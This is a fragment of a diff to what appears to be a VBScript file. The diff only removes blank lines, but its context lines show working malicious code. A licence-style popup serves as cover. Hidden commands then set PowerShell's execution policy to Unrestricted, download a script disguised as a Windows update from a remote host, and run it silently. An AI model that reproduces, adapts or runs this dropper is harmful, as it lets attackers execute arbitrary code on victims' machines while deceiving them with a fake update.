@@ -15,9 +15,3 @@ createobject("wscript.shell").popup "THIS SOFTWARE IS PROVIDED BY THE REGENTS AN
 objShell.Run("cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser"), 0
 objShell.Run("powershell.exe cd $Env:TMP;powershell.exe iwr -Uri http://"+Cmd+"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1"), 0
 }
-
-
-
-
-
-
